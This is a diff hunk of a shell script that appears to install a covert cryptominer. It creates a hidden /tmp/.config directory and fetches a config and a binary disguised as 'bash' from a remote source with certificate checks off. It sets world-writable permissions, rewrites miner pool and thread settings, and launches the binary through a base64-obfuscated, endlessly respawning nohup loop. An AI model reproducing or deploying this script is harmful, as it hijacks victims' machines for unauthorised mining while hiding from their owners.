@@ -13,12 +13,12 @@ cores=`grep 'siblings' /proc/cpuinfo |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+
 
 mkdir -p "/tmp/.config"
 work="/tmp/.config"
-wget --no-check-certificate -qO "$work/config.json" "${src}/z.json"
-wget --no-check-certificate -qO "$work/bash" "${src}/bash"
-chmod -R 777 "$work"
+wget --no-check-certificate -qO "${work}/config.json" "${src}/z.json"
+wget --no-check-certificate -qO "${work}/bash" "${src}/bash"
+chmod -R 777 "${work}"
 
-[ -f "$work/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "$work/config.json"
-[ -f "$work/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "$work/config.json"
+[ -f "${work}/config.json" ] && [ -n "$name" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${name}\",/g" "${work}/config.json"
+[ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
 
 if [ "$mode" == "0" ]; then
   /bin/sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5vaHVwIC4vYmFzaCA+L2Rldi9udWxsIDI+JjEgOyBkb25l' |base64 -d) &
